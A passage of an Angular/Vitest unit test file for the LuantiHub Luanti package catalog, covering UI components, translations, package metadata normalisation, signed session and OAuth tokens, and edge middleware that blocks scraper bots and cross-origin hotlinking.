import { TestBed } from '@angular/core/testing';
import { provideRouter, RouteReuseStrategy } from '@angular/router';
import { App } from './app';
import { CatalogRouteReuseStrategy } from './app.config';
import { routes } from './app.routes';
import { PackageService } from './core/services/package.service';
import { LuantiPackage } from './core/models/package.model';
import { SettingsService } from './core/services/settings.service';
import { SeoService } from './core/services/seo.service';
import { AuthService, formatFriendlyAuthError, sanitizeUserFacingError } from './core/services/auth.service';
import { TranslationService, preloadAllTranslationLocales } from './core/i18n/translation.service';
import { Top10RowComponent } from './features/top10/top10-row.component';
import { CatalogComponent } from './features/catalog/catalog.component';
import { PackageCardComponent } from './features/card/package-card.component';
import { SubmitModalComponent } from './features/submit/submit-modal.component';
import { AuthModalComponent } from './features/auth/auth-modal.component';
import { PackageDetailModalComponent } from './features/modal/package-detail-modal.component';
import { ProfileDrawerComponent } from './features/profile/profile-drawer.component';
import { AuthorDrawerComponent } from './features/author/author-drawer.component';
import { HeaderComponent } from './features/header/header.component';
import { HeroBillboardComponent } from './features/hero/hero-billboard.component';
import { DownloadAnalyticsChartComponent } from './shared/components/download-analytics-chart.component';
import { filterAndSortDrawerPackages } from './shared/components/drawer-pagination.component';
import { PwaService, PERIODIC_SYNC_TAG, ONE_OFF_OUTBOX_SYNC_TAG, ONE_OFF_CATALOG_SYNC_TAG } from './core/services/pwa.service';
import { CompactNumberPipe } from './shared/pipes/compact-number.pipe';
import { TooltipDirective } from './shared/directives/tooltip.directive';
import { ImgFallbackDirective } from './shared/directives/img-fallback.directive';
import { runLuacheckStaticAudit, onRequestPost as gitOnRequestPost } from '../../functions/api/packages/git';
import { onRequestGet as packageStatsOnRequestGet } from '../../functions/api/packages/[author]/[name]/stats';
import { onRequestGet as authorStatsOnRequestGet } from '../../functions/api/authors/[username]/stats';
import {
  onRequest as edgeMiddleware,
  checkEdgeRateLimit,
  detectInboundEphemeralTunnelHeader
} from '../../functions/_middleware';
import {
  autoResolveBrokenRepoReport,
  solveAnubisPowChallengeSync,
  parseGitRepoTarget,
  parseGitSmartHttpRefs,
  syncDebouncedGitVersionStamp,
  parseLuantiBlogFeed,
  ensureExtendedPackageColumns,
  DEFAULT_CONTENTDB_TAGS,
  getUnifiedCatalogTags,
  upsertCustomAppTags,
  normalizeContentDbReviewItem,
  normalizeUtcIsoTimestamp,
  LUANTIHUB_ENGINE_VERSIONS,
  LUANTIHUB_CONTENT_WARNINGS,
  inferGameSupportFromDependencies,
  mergeLuantiHubAndContentDbGameSupport,
  computeLuantiHubFrecencyMetrics,
  resolveLocalizedPackageText,
  parseScreenshotMetaArray,
  findReverseDependenciesForPackage,
  isUntrustedTunnelOrPrivateHost,
  detectGitProviderFromUrl,
  sanitizePackageImageUrl,
  normalizeGitRepoInputUrl,
  isDefunctGitHost
} from '../../functions/api/lib/upstream';
import { onRequestGet as minetestVersionsOnRequestGet } from '../../functions/api/minetest_versions';
import { onRequestGet as contentWarningsOnRequestGet } from '../../functions/api/content_warnings';
import { onRequestPatch as packageDetailOnRequestPatch } from '../../functions/api/packages/[author]/[name]/index';
import {
  syncActivePromotionRowPackages,
  overlayPromotionRowDeltaOnCatalog
} from '../../functions/api/packages/index';
import {
  createSessionToken,
  verifySessionToken,
  verifySessionTokenClaims,
  createAuditProofToken,
  verifyAuditProofToken,
  createOAuthStateToken,
  verifyOAuthStateToken
} from '../../functions/api/auth/lib/session';
import {
  normalizePromoUrl,
  filterActivePromotions,
  onRequestGet as promotionsOnRequestGet,
  onRequestPost as promotionsOnRequestPost,
  onRequestDelete as promotionsOnRequestDelete
} from '../../functions/api/promotions/index';

describe('App & Core Services', () => {
  let defaultFetchRestore: typeof fetch | null = null;

  beforeEach(async () => {
    await preloadAllTranslationLocales();
    defaultFetchRestore = globalThis.fetch;
    globalThis.fetch = (async () => {
      throw new Error('Network disabled in unit tests unless explicitly mocked');
    }) as unknown as typeof fetch;
    try {
      localStorage.removeItem('lh_last_app_update_notif_at_v1');
      localStorage.removeItem('lh_recent_discovered_pkgs_v1');
      sessionStorage.removeItem('lh_pwa_auto_updated_version');
    } catch {
      // Ignore storage errors
    }

    await TestBed.configureTestingModule({
      imports: [App, Top10RowComponent],
      providers: [
        provideRouter(routes),
        { provide: RouteReuseStrategy, useClass: CatalogRouteReuseStrategy }
      ]
    }).compileComponents();
  });

  afterEach(() => {
    if (defaultFetchRestore) {
      globalThis.fetch = defaultFetchRestore;
      defaultFetchRestore = null;
    }
  });

  it('should create the app', () => {
    const fixture = TestBed.createComponent(App);
    const app = fixture.componentInstance;
    expect(app).toBeTruthy();
  });

  it('should render brand title and official legal footer', async () => {
    const fixture = TestBed.createComponent(App);
    await fixture.whenStable();
    const compiled = fixture.nativeElement as HTMLElement;
    expect(compiled.textContent).toContain('LuantiHub');
    expect(compiled.textContent).toContain('DMCA');
    expect(compiled.textContent).toContain(`© ${new Date().getFullYear()}`);
    expect(compiled.textContent).toContain('LGPL-2.1-or-later');
  });

  it('should provide In-Game Setup and GitHub issue tracker link inside header gear menu and footer', async () => {
    const fixture = TestBed.createComponent(App);
    await fixture.whenStable();
    const compiled = fixture.nativeElement as HTMLElement;

    // Open the header gear settings menu
    const gearBtn = compiled.querySelector<HTMLButtonElement>('button[aria-label="PWA and Cache Settings"]');
    expect(gearBtn).toBeTruthy();
    gearBtn?.click();
    fixture.detectChanges();

    const issueLinks = compiled.querySelectorAll<HTMLAnchorElement>(
      'a[href="https://github.com/sakel-hub/luanti-hub/issues/new/choose"]'
    );
    expect(issueLinks.length).toBeGreaterThanOrEqual(2);
    issueLinks.forEach(link => {
      expect(link.getAttribute('target')).toBe('_blank');
      expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    });

    // Verify In-Game Setup is available inside the gear menu
    expect(compiled.textContent).toContain('In-Game Setup');
  });

  it('should support mutually exclusive primary navigation tabs and ContentDB tag filtering', () => {
    const pkgService = TestBed.inject(PackageService);
    pkgService.resetFilters();
    expect(pkgService.hasActiveFilters()).toBe(false);

    pkgService.selectPrimaryNavTab('txp');
    expect(pkgService.selectedType()).toBe('txp');
    expect(pkgService.selectedSource()).toBe('all');

    // Selecting Git Community must deselect Textures ('txp')
    pkgService.selectPrimaryNavTab('git');
    expect(pkgService.selectedType()).toBe('all');
    expect(pkgService.selectedSource()).toBe('git');

    // Selecting Favorites must deselect Git Community ('git')
    pkgService.selectPrimaryNavTab('favorites');
    expect(pkgService.selectedSource()).toBe('all');
    expect(pkgService.showFavoritesOnly()).toBe(true);

    // ContentDB tag filter
    pkgService.setTagFilter('technology');
    expect(pkgService.selectedTag()).toBe('technology');
    expect(pkgService.hasActiveFilters()).toBe(true);

    pkgService.resetFilters();
    expect(pkgService.selectedTag()).toBe('all');
    expect(pkgService.hasActiveFilters()).toBe(false);
  });

  it('should resolve all translation keys across all 6 locales and interpolate {visible}/{shown}', () => {
    const i18n = TestBed.inject(TranslationService);
    const locales = ['en', 'sk', 'de', 'fr', 'es', 'ru'] as const;
    const criticalKeys = [
      'hero.downloadZip',
      'card.match',
      'modal.downloadZip',
      'modal.setupGuide',
      'modal.registryConfig',
      'modal.registryConfigDesc',
      'modal.codeLicense',
      'modal.mediaLicense',
      'modal.tabReleases',
      'modal.signInToReviewBtn',
      'setup.optionA',
      'setup.optionADesc',
      'setup.optionAStep1',
      'setup.optionAStep2',
      'setup.optionAStep3',
      'setup.optionB',
      'setup.copy',
      'setup.copyUrl',
      'setup.step1',
      'setup.whereToFindConf',
      'setup.confShortcutTip',
      'setup.confWindowsPath',
      'setup.confLinuxPath',
      'setup.confMacPath',
      'setup.confAndroidPath',
      'setup.confIosPath',
      'setup.failoverNote',
      'modal.optionASettingsHint',
      'catalog.showingCount',
      'catalog.filterByTag',
      'header.reportIssue',
      'header.reportIssueTooltip',
      'footer.reportIssue',
      'submit.guestNoticeTitle',
      'submit.guestNoticeDesc',
      'profile.verifySyncGitBtn',
      'profile.gitSyncLabel',
      'profile.gitSyncedBadge',
      'profile.gitQueuedBadge',
      'profile.gitBrokenBadge',
      'common.refresh'
    ];

    for (const loc of locales) {
      i18n.setLocale(loc);
      for (const key of criticalKeys) {
        const val = i18n.translate(key, { shown: 12, total: 48 });
        expect(val).not.toBe(key);
        expect(val).not.toContain('{visible}');
        expect(val).not.toContain('{shown}');
      }
    }
    i18n.setLocale('en');
  });

  it('should toggle favorites case-insensitively in SettingsService and sync with server', () => {
    const settings = TestBed.inject(SettingsService);
    const id = 'test_author/test_mod';
    if (settings.isFavorite(id)) {
      settings.removeFavorite(id);
    }
    expect(settings.isFavorite(id)).toBe(false);
    settings.toggleFavorite(id);
    expect(settings.isFavorite(id)).toBe(true);
    expect(settings.isFavorite('TEST_AUTHOR/TEST_MOD')).toBe(true);
    settings.removeFavorite('TEST_AUTHOR/TEST_MOD');
    expect(settings.isFavorite(id)).toBe(false);
  });

  it('should close package details modal when searching by dependency or author from modal', () => {
    const pkgService = TestBed.inject(PackageService);
    pkgService.openPackageModal({
      id: 'ElCeejo/animalia',
      author: 'ElCeejo',
      name: 'animalia',
      title: 'Animalia',
      type: 'mod',
      short_desc: 'Wildlife mod',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 25000,
      license: 'MIT',
      source: 'official',
      tags: ['mobs']
    });
    expect(pkgService.activePackage()?.id).toBe('ElCeejo/animalia');

    pkgService.searchByTermFromModal('creatura');
    expect(pkgService.activePackage()).toBeNull();
    expect(pkgService.searchQuery()).toBe('creatura');
  });

  it('should update canonical link and JSON-LD structured data in SeoService', () => {
    const seo = TestBed.inject(SeoService);
    seo.updateForPackage({
      id: 'Zughy/soothing32',
      author: 'Zughy',
      name: 'soothing32',
      title: 'Soothing 32',
      type: 'txp',
      short_desc: 'Lightweight texture pack',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 42000,
      license: 'LGPL-2.1-only',
      source: 'official',
      tags: ['txp']
    });

    const scriptEl = document.getElementById('luanti-pkg-jsonld');
    expect(scriptEl).toBeTruthy();
    expect(scriptEl?.textContent).toContain('Soothing 32');

    seo.resetToHome();
    expect(document.getElementById('luanti-pkg-jsonld')).toBeNull();
  });

  it('should define 10 straight geometric SVG numerals in Top10RowComponent', () => {
    const fixture = TestBed.createComponent(Top10RowComponent);
    const comp = fixture.componentInstance;
    expect(comp.rankNumerals.length).toBe(10);
    comp.rankNumerals.forEach(numeral => {
      expect(numeral.d).toContain('L');
      expect(numeral.vb).toContain('200');
    });
  });

  it('should preserve the current background page filter state when opening a package detail modal', () => {
    const pkgService = TestBed.inject(PackageService);
    pkgService.selectPrimaryNavTab('txp');
    expect(pkgService.selectedType()).toBe('txp');

    // Reset to Home ('all') as Header.onHomeClick() does
    pkgService.resetFilters(true);
    expect(pkgService.selectedType()).toBe('all');
    expect(pkgService.hasActiveFilters()).toBe(false);

    // Opening a texture pack tile from Home must keep selectedType() as 'all'
    pkgService.openPackageModal({
      id: 'Zughy/soothing32',
      author: 'Zughy',
      name: 'soothing32',
      title: 'Soothing 32',
      type: 'txp',
      short_desc: 'Lightweight texture pack',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 42000,
      license: 'CC-BY-SA-4.0',
      source: 'official',
      tags: ['txp']
    });
    expect(pkgService.selectedType()).toBe('all');
    expect(pkgService.hasActiveFilters()).toBe(false);
    pkgService.closePackageModal();
    expect(pkgService.selectedType()).toBe('all');
  });

  it('should normalize defunct NotABug Git URLs to Codeberg and avoid broken GitHub guesses', () => {
    const pkgService = TestBed.inject(PackageService);
    expect(pkgService.normalizeGitRepoUrl('https://notabug.org/TenPlus1/mobs_ghost_redo')).toBe(
      'https://codeberg.org/tenplus1/mobs_ghost_redo'
    );
    expect(pkgService.normalizeGitRepoUrl('https://codeberg.org/tenplus1/mobs_ghost_redo.git/')).toBe(
      'https://codeberg.org/tenplus1/mobs_ghost_redo'
    );
  });

  it('should deduplicate and merge a ContentDB package that is also submitted via Git URL with both official and git sources', () => {
    const pkgService = TestBed.inject(PackageService);
    const contentDbPkg = {
      id: 'ElCeejo/x_mob_core',
      author: 'ElCeejo',
      name: 'x_mob_core',
      title: 'X Mob Core',
      type: 'mod' as const,
      short_desc: 'Mob API and core behaviors',
      thumbnail: 'https://content.luanti.org/uploads/shot-0.png',
      score: 4.5,
      downloads: 8400,
      license: '',
      source: 'official' as const,
      sources: ['official' as const],
      tags: ['mod', 'mobs']
    };
    const gitSubmittedPkg = {
      id: 'elceejo-dev/x_mob_core',
      author: 'elceejo-dev',
      name: 'x_mob_core',
      title: 'X Mob Core',
      type: 'mod' as const,
      short_desc: 'Mob API and core behaviors',
      thumbnail: 'logo.svg',
      score: 0,
      downloads: 0,
      license: 'MIT',
      repo_url: 'https://github.com/elceejo-dev/x_mob_core',
      provider: 'github' as const,
      dependencies: ['default'],
      source: 'git' as const,
      sources: ['git' as const],
      tags: ['git', 'github', 'mod']
    };

    const merged = pkgService.mergeDualSourcePackage(contentDbPkg, gitSubmittedPkg);
    expect(merged.id).toBe('ElCeejo/x_mob_core');
    expect(merged.downloads).toBe(8400);
    expect(merged.thumbnail).toBe('https://content.luanti.org/uploads/shot-0.png');
    expect(merged.repo_url).toBe('https://github.com/elceejo-dev/x_mob_core');
    expect(merged.license).toBe('MIT');
    expect(merged.dependencies).toContain('default');
    expect(merged.sources).toContain('official');
    expect(merged.sources).toContain('git');
  });

  it('should reuse CatalogComponent across modal routes so scroll position is preserved', () => {
    const strategy = TestBed.inject(RouteReuseStrategy);
    const homeSnap = { component: CatalogComponent, routeConfig: routes[0] } as any;
    const pkgSnap = { component: CatalogComponent, routeConfig: routes[1] } as any;
    const submitSnap = { component: CatalogComponent, routeConfig: routes[2] } as any;

    expect(strategy.shouldReuseRoute(pkgSnap, homeSnap)).toBe(true);
    expect(strategy.shouldReuseRoute(homeSnap, pkgSnap)).toBe(true);
    expect(strategy.shouldReuseRoute(submitSnap, homeSnap)).toBe(true);
  });

  it('should compute dynamic and personalized Match % from contentdb_score, favorites, and per-user download counts', () => {
    const pkgService = TestBed.inject(PackageService);
    const settings = TestBed.inject(SettingsService);

    const lowScoreMod = {
      id: 'authorA/small_mod',
      author: 'authorA',
      name: 'small_mod',
      title: 'Small Mod',
      type: 'mod' as const,
      short_desc: 'Small utility',
      thumbnail: 'logo.svg',
      score: 0,
      contentdb_score: 18,
      downloads: 0,
      license: 'MIT',
      source: 'official' as const,
      tags: ['tools']
    };

    const highScoreGame = {
      id: 'Wuzzy/mineclone2',
      author: 'Wuzzy',
      name: 'mineclone2',
      title: 'VoxeLibre',
      type: 'game' as const,
      short_desc: 'Survival sandbox game',
      thumbnail: 'logo.svg',
      score: 0,
      contentdb_score: 3150,
      downloads: 0,
      license: 'GPL-3.0-only',
      source: 'official' as const,
      tags: ['survival', 'pve']
    };

    const baselineLow = pkgService.getMatchScore(lowScoreMod);
    const baselineHigh = pkgService.getMatchScore(highScoreGame);
    expect(baselineHigh).toBeGreaterThan(baselineLow);

    // Recording downloads for a package boosts its personalized match score
    settings.recordLocalDownload('authorA/small_mod');
    settings.recordLocalDownload('authorA/small_mod');
    expect(settings.getDownloadCount('authorA/small_mod')).toBeGreaterThanOrEqual(2);
    expect(pkgService.getMatchScore(lowScoreMod)).toBeGreaterThan(baselineLow);
  });

  it('should reject fake init.lua files without Luanti engine APIs and pass real Luanti scripts', () => {
    const fakeDiags = runLuacheckStaticAudit('local x = 42\nprint("unrelated repo")', 'fake_mod');
    expect(fakeDiags.some(d => d.code === 'LUA_NO_ENGINE_API' && d.severity === 'error')).toBe(true);

    const validDiags = runLuacheckStaticAudit(
      'local modname = core.get_current_modname()\ncore.register_node("my_mod:stone", { description = "Stone" })',
      'my_mod'
    );
    expect(validDiags.some(d => d.code === 'LUA_NO_ENGINE_API')).toBe(false);
    expect(validDiags.some(d => d.code === 'LUA_ENGINE_API_OK' && d.severity === 'pass')).toBe(true);
  });

  it('should not store personal user profiles or credentials in browser storage and should verify provider ownership', async () => {
    const authService = TestBed.inject(AuthService);
    await authService.loginWithHandle('codeberg', 'test_creator');

    expect(localStorage.getItem('lh_local_user')).toBeNull();
    expect(sessionStorage.getItem('lh_auth_cache_v2')).toBeNull();
    // Unverified handle sign-in must not grant verified repository ownership
    expect(authService.hasVerifiedProviderOwnership('codeberg', 'test_creator')).toBe(false);
  });

  it('should disable Publish until Pre-Flight Audit passes with a cryptographic auditToken', async () => {
    const fixture = TestBed.createComponent(SubmitModalComponent);
    const comp = fixture.componentInstance;

    comp.repoUrl = 'https://codeberg.org/test_creator/my_mod';
    comp.onUrlChange();
    comp.warrantyOwnership = true;
    comp.warrantyAssets = true;
    comp.warrantyTakedown = true;

    // Before running Pre-Flight Check, Publish must remain disabled
    expect(comp.canPublish()).toBe(false);

    // Even if ownership is verified, without a passing auditToken it stays disabled
    const token = await createAuditProofToken('codeberg:test_creator/my_mod', 'test-secret');
    expect(await verifyAuditProofToken(token, 'codeberg:test_creator/my_mod', 'test-secret')).toBe(true);
    expect(await verifyAuditProofToken(token, 'codeberg:other_user/other_mod', 'test-secret')).toBe(false);

    comp.auditReport.set({
      valid: true,
      auditToken: token,
      ownershipVerified: true,
      configFound: 'mod.conf',
      luacheckPassed: true,
      licenseValid: true,
      diagnostics: []
    });

    expect(comp.canPublish()).toBe(true);
  });

  it('should parse mod.conf line-by-line without false positives for empty depends followed by optional_depends', async () => {
    const service = TestBed.inject(PackageService);

    vi.spyOn(service as any, 'getRepoRootListing').mockResolvedValue([
      { name: 'mod.conf', type: 'file', download_url: 'https://raw.githubusercontent.com/sakel-hub/x_mob_core/main/mod.conf' },
      { name: 'init.lua', type: 'file', download_url: 'https://raw.githubusercontent.com/sakel-hub/x_mob_core/main/init.lua' }
    ]);

    const mockConf = `name = x_mob_core
depends =
optional_depends = player_monoids, pova, playerphysics
author = ElCeejo
description = Mob animation and spawning framework.
`;

    vi.spyOn(globalThis, 'fetch').mockImplementation((input: any) => {
      const url = String(input);
      if (url.includes('mod.conf')) {
        return Promise.resolve(new Response(mockConf, { status: 200 }));
      }
      return Promise.resolve(new Response('', { status: 404 }));
    });

    const mockPkg: any = {
      author: 'sakel-hub',
      name: 'x_mob_core',
      title: 'X Mobs Core',
      type: 'mod'
    };

    const result = await (service as any).probeGitRepoMetadata(mockPkg, 'https://github.com/sakel-hub/x_mob_core');
    expect(result.deps).toEqual([]);
    expect(result.optDeps).toEqual(['player_monoids', 'pova', 'playerphysics']);
  });

  it('should format accurate download_size from ContentDB /for-client/ and omit file_size for Git-only packages without known size', () => {
    const service = TestBed.inject(PackageService);

    expect(service.formatDownloadSize(2621440)).toBe('2.5 MB');
    expect(service.formatDownloadSize('2.5 MB')).toBe('2.5 MB');
    expect(service.formatDownloadSize(769024)).toBe('751 KB');
    expect(service.formatDownloadSize('751 KB')).toBe('751 KB');
    expect(service.formatDownloadSize(undefined)).toBeUndefined();
    expect(service.formatDownloadSize(0)).toBeUndefined();

    // Poisoned '2 KB' legacy file_size from HTML error page must be discarded when download_size is missing
    const poisonedNormalized = (service as any).normalizePackage({
      author: 'ElCeejo',
      name: 'draconis',
      title: 'Draconis',
      type: 'mod',
      file_size: '2 KB'
    });
    expect(poisonedNormalized.file_size).toBeUndefined();

    const draconisNormalized = (service as any).normalizePackage({
      author: 'ElCeejo',
      name: 'draconis',
      title: 'Draconis',
      type: 'mod',
      short_description: 'Adds terrifying Dragons and powerful equipment.',
      download_size: 2621440,
      downloads: 48200,
      donate_url: 'https://ko-fi.com/elceejo',
      forum_url: 'https://forum.luanti.org/viewtopic.php?t=26142',
      translation_url: 'https://hosted.weblate.org/projects/draconis',
      video_url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
      video_thumbnail_url: 'https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg',
      provides: ['draconis', 'draconis_aux'],
      dev_state: 'ACTIVELY_DEVELOPED',
      content_warnings: ['fantasy_violence'],
      ai_disclosures: ['no_ai']
    });

    expect(draconisNormalized.file_size).toBe('2.5 MB');
    expect(draconisNormalized.download_size).toBe(2621440);
    expect(draconisNormalized.contentdb_downloads).toBe(48200);
    expect(draconisNormalized.luantihub_downloads).toBe(0);
    expect(draconisNormalized.downloads).toBe(48200);
    expect(draconisNormalized.donate_url).toBe('https://ko-fi.com/elceejo');
    expect(draconisNormalized.forum_url).toBe('https://forum.luanti.org/viewtopic.php?t=26142');
    expect(draconisNormalized.translation_url).toBe('https://hosted.weblate.org/projects/draconis');
    expect(draconisNormalized.video_url).toBe('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
    expect(draconisNormalized.provides).toEqual(['draconis', 'draconis_aux']);
    expect(draconisNormalized.dev_state).toBe('ACTIVELY_DEVELOPED');
    expect(draconisNormalized.content_warnings).toEqual(['fantasy_violence']);

    // Git-only package without known download_size or file_size must have file_size === undefined (never fake 751 KB)
    const gitOnlyNormalized = (service as any).normalizePackage({
      author: 'sakel-hub',
      name: 'x_mobs',
      title: 'X Mobs',
      type: 'mod',
      source: 'git',
      repo_url: 'https://github.com/sakel-hub/x_mobs'
    });
    expect(gitOnlyNormalized.file_size).toBeUndefined();
  });

  it('should not leak unrelated third-party repository READMEs when a package repository has no README.md', async () => {
    const service = TestBed.inject(PackageService);

    // Mock root listing for ElCeejo/draconis without any README file
    vi.spyOn(service as any, 'getRepoRootListing').mockResolvedValue([
      { name: 'mod.conf', type: 'file', download_url: 'https://raw.githubusercontent.com/ElCeejo/draconis/main/mod.conf' },
      { name: 'init.lua', type: 'file', download_url: 'https://raw.githubusercontent.com/ElCeejo/draconis/main/init.lua' }
    ]);

    const draconisPkg: any = {
      id: 'ElCeejo/draconis',
      author: 'ElCeejo',
      name: 'draconis',
      title: 'Draconis',
      type: 'mod',
      repo_url: 'https://github.com/ElCeejo/draconis'
    };

    const readme = await (service as any).fetchRawReadmeFromRepo('https://github.com/ElCeejo/draconis', draconisPkg);
    expect(readme).toBeUndefined();
  });

  it('should render category and source badges in the bottom content section of PackageCardComponent rather than overlaying the thumbnail', () => {
    const service = TestBed.inject(PackageService);
    const fixture = TestBed.createComponent(PackageCardComponent);
    const comp = fixture.componentInstance;
    comp.package = (service as any).normalizePackage({
      id: 'sakel-hub/x_mob_core',
      author: 'sakel-hub',
      name: 'x_mob_core',
      title: 'X Mob Core',
      type: 'mod',
      short_desc: 'A smooth, lightweight mob framework.',
      thumbnail: 'https://content.luanti.org/thumbnails/1/x_mob_core.png',
      repo_url: 'https://github.com/sakel-hub/x_mob_core',
      source: 'official',
      sources: ['official', 'git'],
      downloads: 1200,
      tags: ['pve', 'pvp']
    });
    fixture.detectChanges();

    const el = fixture.nativeElement as HTMLElement;
    const thumbnailBox = el.querySelector('.aspect-video') as HTMLElement;
    expect(thumbnailBox).toBeTruthy();
    expect(thumbnailBox.textContent).not.toContain('ContentDB');
    expect(thumbnailBox.textContent).not.toContain('Git');

    const contentSection = el.querySelector('.flex-1.flex.flex-col.justify-between') as HTMLElement;
    expect(contentSection).toBeTruthy();
    expect(contentSection.textContent).toContain('mod');
    expect(contentSection.textContent).toContain('ContentDB');
    expect(contentSection.textContent).toContain('Git');

    const badges = contentSection.querySelectorAll('app-package-badges .glass-badge');
    expect(badges.length).toBe(3);
    expect(badges[0].classList.contains('glass-badge-sky')).toBe(true);
    expect(badges[1].classList.contains('glass-badge-emerald')).toBe(true);
    expect(badges[2].classList.contains('glass-badge-amber')).toBe(true);
  });

  it('should prioritize 1-Click OAuth sign-in (including Mesehub) with Direct Sign-In collapsed by default and no trailing colon after favorites', () => {
    const i18n = TestBed.inject(TranslationService);
    expect(i18n.translate('auth.quickClaimDesc').endsWith(':')).toBe(false);
    expect(i18n.translate('auth.directLoginDesc').endsWith(':')).toBe(false);

    const fixture = TestBed.createComponent(AuthModalComponent);
    const comp = fixture.componentInstance;
    fixture.detectChanges();

    expect(comp.isDirectSignInExpanded()).toBe(false);
    const el = fixture.nativeElement as HTMLElement;
    expect(el.textContent).toContain('Continue with Codeberg');
    expect(el.textContent).toContain('Continue with Mesehub');
    expect(el.textContent).toContain('Continue with GitLab');
    expect(el.textContent).toContain('Continue with GitHub');
    expect(el.textContent).toContain('Sign in with ContentDB');

    comp.toggleDirectSignIn();
    fixture.detectChanges();
    expect(comp.isDirectSignInExpanded()).toBe(true);
    const options = Array.from(el.querySelectorAll('select option')).map(o => (o as HTMLOptionElement).value);
    expect(options).toContain('mesehub');
  });

  it('should detect git.minetest.land as mesehub provider and extract embedded video URLs from descriptions', () => {
    const service = TestBed.inject(PackageService);
    const mesehubPkg = (service as any).normalizePackage({
      author: 'BuckarooBanzay',
      name: 'mesecons',
      title: 'Mesecons',
      type: 'mod',
      repo_url: 'https://git.minetest.land/MineClone2/MineClone2',
      long_description: 'Check out the showcase trailer at https://www.youtube.com/watch?v=dQw4w9WgXcQ for gameplay!'
    });

    expect(mesehubPkg.provider).toBe('mesehub');
    expect(mesehubPkg.video_url).toBe('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
    expect(mesehubPkg.video_thumbnail_url).toBe('https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg');
  });

  it('should synchronize screenshot thumbnail strip scroll position when navigating slides in PackageDetailModalComponent', () => {
    const service = TestBed.inject(PackageService);
    const fixture = TestBed.createComponent(PackageDetailModalComponent);
    const comp = fixture.componentInstance;
    comp.package = (service as any).normalizePackage({
      id: 'ElCeejo/draconis',
      author: 'ElCeejo',
      name: 'draconis',
      title: 'Draconis',
      type: 'mod',
      screenshots: [
        'https://content.luanti.org/shot1.png',
        'https://content.luanti.org/shot2.png',
        'https://content.luanti.org/shot3.png'
      ]
    });
    fixture.detectChanges();

    const scrollSpy = vi.spyOn(comp as any, 'scrollActiveThumbnailIntoView');
    comp.nextMediaSlide();
    expect(comp.mediaCarouselIndex()).toBe(1);
    expect(scrollSpy).toHaveBeenCalledWith(1);

    comp.goToMediaSlide(2);
    expect(comp.mediaCarouselIndex()).toBe(2);
    expect(scrollSpy).toHaveBeenCalledWith(2);
  });

  it('should format download counts with compact k/M/B abbreviations via CompactNumberPipe', () => {
    const pipe = new CompactNumberPipe();
    expect(pipe.transform(0)).toBe('0');
    expect(pipe.transform(42)).toBe('42');
    expect(pipe.transform(1000)).toBe('1k');
    expect(pipe.transform(1200)).toBe('1.2k');
    expect(pipe.transform(139553)).toBe('139.6k');
    expect(pipe.transform(783360)).toBe('783.4k');
    expect(pipe.transform(1500000)).toBe('1.5M');
  });

  it('should prevent stuck tooltips by dismissing on scroll/wheel and omitting tooltip from outer package card', () => {
    const fixture = TestBed.createComponent(PackageCardComponent);
    const service = TestBed.inject(PackageService);
    fixture.componentInstance.package = (service as any).normalizePackage({
      id: 'ElCeejo/draconis',
      author: 'ElCeejo',
      name: 'draconis',
      title: 'Draconis',
      type: 'mod'
    });
    fixture.detectChanges();

    const rootEl = (fixture.nativeElement as HTMLElement).querySelector('.glass-card') as HTMLElement;
    expect(rootEl).toBeTruthy();
    expect(rootEl.getAttribute('apptooltip')).toBeNull();
    expect(rootEl.getAttribute('aria-describedby')).toBeNull();

    // Verify TooltipDirective auto-dismisses on scroll
    const testBtn = document.createElement('button');
    (testBtn as any).matches = (selector: string) => selector.includes(':hover');
    document.body.appendChild(testBtn);
    const directive = TestBed.runInInjectionContext(() => new TooltipDirective());
    (directive as any).el = { nativeElement: testBtn };
    directive.appTooltip = 'Test tooltip';
    directive.ngOnInit();
    (directive as any).show();

    expect(document.querySelector('.luanti-tooltip')).toBeTruthy();

    window.dispatchEvent(new Event('scroll'));
    expect(document.querySelector('.luanti-tooltip')).toBeNull();
    testBtn.remove();
  });

  it('should generate and verify URL-safe HMAC OAuth state tokens and reject provider mismatches', async () => {
    const secret = 'test-oauth-hmac-secret-key';
    const stateToken = await createOAuthStateToken('github', secret);
    expect(stateToken).not.toContain('+');
    expect(stateToken).not.toContain('/');
    expect(await verifyOAuthStateToken(stateToken, 'github', secret)).toBe(true);
    expect(await verifyOAuthStateToken(stateToken, 'codeberg', secret)).toBe(false);
    expect(await verifyOAuthStateToken(stateToken, 'github', 'wrong-secret')).toBe(false);
  });

  it('should guard edge API against cross-origin hotlinking, bots, rate abuse, and unauthenticated git audits', async () => {
    // 0. 301-redirect legacy luanti-hub.pages.dev web routes to canonical https://luantihub.org
    const legacyPageReq = new Request('https://luanti-hub.pages.dev/package/sakel/x_farming?lang=en');
    const legacyPageRes = await edgeMiddleware({
      request: legacyPageReq,
      next: async () => new Response('ok'),
      env: {}
    });
    expect(legacyPageRes.status).toBe(301);
    expect(legacyPageRes.headers.get('Location')).toBe('https://luantihub.org/package/sakel/x_farming?lang=en');

    // 1. Block known scraper bots on /api/*
    const botReq = new Request('https://luantihub.org/api/packages', {
      headers: { 'User-Agent': 'Mozilla/5.0 (compatible; GPTBot/1.0)' }
    });
    const botRes = await edgeMiddleware({
      request: botReq,
      next: async () => new Response('ok'),
      env: {}
    });
    expect(botRes.status).toBe(403);

    // 2. Block cross-origin browser hotlinking on /api/*
    const crossOriginReq = new Request('https://luantihub.org/api/packages', {
      headers: { Origin: 'https://evil-scraper.example.com' }
    });
    const crossOriginRes = await edgeMiddleware({
      request: crossOriginReq,
      next: async () => new Response('ok'),
      env: {}
    });
    expect(crossOriginRes.status).toBe(403);

    // 3. Allow legitimate Luanti in-game client requests (no Origin header)
    const luantiClientReq = new Request('https://luantihub.org/api/packages', {
      headers: { 'User-Agent': 'Luanti/5.10.0' }
    });
    const luantiClientRes = await edgeMiddleware({
      request: luantiClientReq,
      next: async () => new Response('ok'),
      env: {}
    });
    expect(luantiClientRes.status).toBe(200);

    // 3b. Allow cross-site OAuth callback redirects from identity providers (e.g. GitHub, GitLab, Codeberg)
    const oauthCallbackReq = new Request('https://luantihub.org/api/auth/github/callback?code=abc123xyz&state=hmac_state', {
